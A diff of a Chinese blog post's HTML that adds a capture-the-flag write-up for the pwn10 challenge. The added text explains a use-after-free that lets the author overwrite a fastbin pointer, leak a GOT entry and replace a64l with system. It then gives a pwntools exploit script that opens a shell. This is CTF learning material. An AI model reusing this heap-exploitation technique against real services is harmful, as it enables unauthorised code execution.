@@ -177,7 +177,7 @@
             </div>
             <h2 class="post-title">第五空间pwn记录</h2>
             <div class="post-meta">
-                本文总共4165个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+                本文总共5262个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
             </div>
         </div>
         <div class="post-content markdown-body">
@@ -240,9 +240,19 @@
 </li>
 </ul>
 <h4 id="题目pwn10"><a href="#题目pwn10" class="headerlink" title="题目pwn10"></a>题目pwn10</h4><ul>
-<li>漏洞<ul>
-<li></li>
+<li><p>漏洞</p>
+<ul>
+<li><p>题目比较特别，每个note都有两个heap结构，一个存放node，一个content，都是fastbin（0x30)其中node指向content。但是在edit功能中，提供了将堆content地址另存的一条路径。使得即使已经free的content，仍然可以edit。也就是可以更改fastbin的fd指针，所以我们可以edit一个note，再delete它。此时fastbin中链表是 content0 -&gt;  node0。此时如果我们再次edit该note，就可以将content0直向别处chunk，再add一个note，content0将作为new node，伪造的chunk将作为new content。如果把node1作为new content（伪造的chunk），那么content0和node1是同一个chunk，我们就可以编辑content0而改变node1，即content1的地址达到泄露地址、任意地址写的目的。</p>
+<img src="/2019/09/12/第五空间pwn记录/16.png" title="[]">
+<img src="/2019/09/12/第五空间pwn记录/17.png" title="[]">
+</li>
+<li><p>show比较搞人，只输出2个byte。幸好，system和a64l函数地址只在低2位相差。</p>
+<img src="/2019/09/12/第五空间pwn记录/18.png" title="[]">
+</li>
 </ul>
+</li>
+<li><p>利用exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">'a'</span>*<span class="number">0x10</span>)						<span class="comment">#0		</span></span><br><span class="line">add(<span class="string">'b'</span>*<span class="number">0x10</span>)						<span class="comment">#1</span></span><br><span class="line">add(<span class="string">'/bin/sh\x00'</span>)					<span class="comment">#2</span></span><br><span class="line">add(<span class="string">'c'</span>*<span class="number">0x10</span>)						<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p, <span class="string">'b* 0x400F81'</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'b'</span>*<span class="number">0x10</span>) 	<span class="comment">#chunk_0_addr is in cache</span></span><br><span class="line">delete(<span class="number">0</span>)			<span class="comment">#node0, content0</span></span><br><span class="line"></span><br><span class="line">editagain(<span class="string">'\x60'</span>)			<span class="comment">#chunk_0_fd is in our writen points to chunk1'node	</span></span><br><span class="line"></span><br><span class="line">add(p64(elf.got[<span class="string">'a64l'</span>]))	<span class="comment">#node0 is content0, content0 is node1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#3only leak 2 bytes</span></span><br><span class="line">atol_addr = u16(p.recv(<span class="number">2</span>))</span><br><span class="line">system_addr = atol_addr - libc.symbols[<span class="string">'a64l'</span>] + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'system addr =&gt; '</span> + hex(system_addr)</span><br><span class="line">edit(<span class="number">1</span>,p16(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">"choice :"</span>)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <h4 id="题目pwn-11"><a href="#题目pwn-11" class="headerlink" title="题目pwn 11"></a>题目pwn 11</h4><ul>
